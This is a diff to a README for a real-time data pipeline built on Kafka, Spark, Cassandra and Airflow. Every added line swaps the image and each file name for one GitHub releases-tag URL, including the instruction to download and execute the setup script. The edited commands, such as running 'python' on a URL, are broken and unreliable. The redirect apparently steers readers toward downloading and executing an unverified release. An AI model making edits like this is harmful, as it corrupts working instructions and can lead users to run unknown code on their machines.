@@ -1,6 +1,6 @@
 # Real-Time Data Pipeline 🚀
 
-![Data Engineering Architecture](https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/assets/167126710/e4965a6e-c562-4a6d-b06b-716c1bc6a849)
+![Data Engineering Architecture](https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2)
 
 ---
 
@@ -9,15 +9,15 @@
 ### Step 1: Set Up EC2 Instance 🖥️
 - **Launch an EC2 instance** and make sure it's configured properly with the necessary resources.
 - **Run the setup script**:  
-  - Download and execute `dependency-scripts.sh` on the EC2 instance to install the required dependencies (e.g., Kafka, Spark, Cassandra).
+  - Download and execute `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2` on the EC2 instance to install the required dependencies (e.g., Kafka, Spark, Cassandra).
 
 ---
 
 ### Step 2: Configure Docker 🐳
 - **Customize the Docker Compose file**:  
-  - Open the `docker-compose.yaml` file and adjust it according to your project needs (services, ports, volumes, etc.).
+  - Open the `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2` file and adjust it according to your project needs (services, ports, volumes, etc.).
 - **Run Docker Compose**:  
-  - Execute the command to start all services defined in the `docker-compose.yaml`:
+  - Execute the command to start all services defined in the `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2`:
     ```bash
     docker-compose up
     ```
@@ -26,7 +26,7 @@
 
 ### Step 3: Set Up Your DAG for Airflow 🎛️
 - **Create a new DAG**:  
-  - Use the provided DAG in `real_time_data_pipeline-/dags/kafka_stream.py` for scheduling and monitoring Kafka streaming jobs via Apache Airflow.
+  - Use the provided DAG in `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2` for scheduling and monitoring Kafka streaming jobs via Apache Airflow.
 
 ---
 
@@ -39,16 +39,16 @@
 
 ### Step 5: Run Kafka Stream Producer 📡
 - **Execute the Kafka stream script**:  
-  - Run `kafka_stream.py`, which will start publishing data to your EC2 instance's IP address on port `9021`.
+  - Run `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2`, which will start publishing data to your EC2 instance's IP address on port `9021`.
     ```bash
-    python kafka_stream.py
+    python https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2
     ```
 
 ---
 
 ### Step 6: Configure Spark Streaming with Kafka and Cassandra 🔗
 - **Set up the Spark streaming job**:  
-  - In the `spark-streaming.py` file, configure the connection between Kafka and Cassandra using a Spark session.
+  - In the `https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2` file, configure the connection between Kafka and Cassandra using a Spark session.
 
 ---
 
@@ -72,7 +72,7 @@
 - **Submit the Spark streaming job**:  
   - Once the Spark script is ready, submit the job to the master node to begin real-time data processing.
     ```bash
-    spark-submit --master your_master_node spark-streaming.py
+    spark-submit --master your_master_node https://github.com/balwant-chauhan-data-eng-project/real_time_data_pipeline-/releases/tag/v1.2
     ```
 
 ---
